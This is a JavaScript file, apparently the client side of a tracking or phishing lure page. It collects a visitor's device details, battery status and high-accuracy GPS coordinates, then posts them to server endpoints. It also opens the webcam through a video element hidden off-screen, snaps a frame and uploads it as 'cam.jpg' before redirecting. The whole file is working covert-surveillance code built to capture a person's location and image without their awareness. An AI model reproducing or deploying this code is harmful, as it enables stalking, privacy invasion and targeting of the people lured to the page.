// 1. Device Info
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;

  var brw = 'Unknown'; 
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';

  var ht = window.screen.height;
  var wd = window.screen.width;
  
  if(os.includes(';')) {
      os = os.substring(0, os.indexOf(')'));
      os = os.split(';')[1];
      if (os) os = os.trim();
  }

  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// 2. Location Logic (First Priority)
function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(
      function(position) { showPosition(position, callback); }, 
      function(error) { showError(error, errCallback); }, 
      optn
    );
  } else {
    if(errCallback) errCallback();
  }
}

function showError(error, errCallback) {
  var err_text = 'Unknown';
  switch (error.code) {
    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
    case error.TIMEOUT: err_text = 'Location timed out'; break;
  }
  
  $.ajax({
    type: 'POST',
    url: error_file,
    data: { Status: 'failed', Error: err_text },
    success: function() { if(errCallback) errCallback(); },
    mimeType: 'text'
  });
}

function showPosition(position, callback) {
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  var acc = position.coords.accuracy;
  var alt = position.coords.altitude || 0;
  var dir = position.coords.heading || 0;
  var spd = position.coords.speed || 0;

  $.ajax({
    type: 'POST',
    url: result_file,
    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
    success: function() { 
        if(callback) callback(); 
    },
    error: function() {
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}

// 3. Camera Logic (Fixed Canvas Crash)
function captureAndSend(callback) {
  // 1. Create Video Element and attach to DOM (Fix for Mac)
  var video = document.createElement('video');
  video.style.position = "fixed";
  video.style.top = "-10000px"; // Hide it off-screen
  video.style.left = "-10000px";
  document.body.appendChild(video); // CRITICAL: Mac requires element in DOM

  var canvas = document.getElementById('canvas');

  // Safety Timer: Redirect if stuck for 5 seconds
  var safetyTimer = setTimeout(function() {
      if(callback) callback();
      try { document.body.removeChild(video); } catch(e){} // Cleanup
  }, 5000);

  video.autoplay = true;
  video.muted = true;
  video.playsInline = true;

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      video.srcObject = stream;
      video.play();

      // Wait for data to be ready
      video.onloadeddata = function() {
          // Additional slight delay to ensure first frame is rendered
          setTimeout(function() {
            clearTimeout(safetyTimer);
            
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(function(blob) {
                  var formData = new FormData();
                  formData.append('image', blob, 'cam.jpg');

                  $.ajax({
                    url: upload_file, 
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                      if (callback) callback();
                    },
                    error: function() {
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                      if (callback) callback(); 
                    }
                  });
                }, 'image/jpeg', 0.8);
            } else {
                // If video is still empty, just redirect
                stream.getTracks().forEach(track => track.stop());
                try { document.body.removeChild(video); } catch(e){}
                if (callback) callback();
            }
          }, 500);
      };
    }).catch(function(err) {
      clearTimeout(safetyTimer);
      try { document.body.removeChild(video); } catch(e){}
      if (callback) callback();
    });
  } else {
    clearTimeout(safetyTimer);
    if (callback) callback();
  }
}
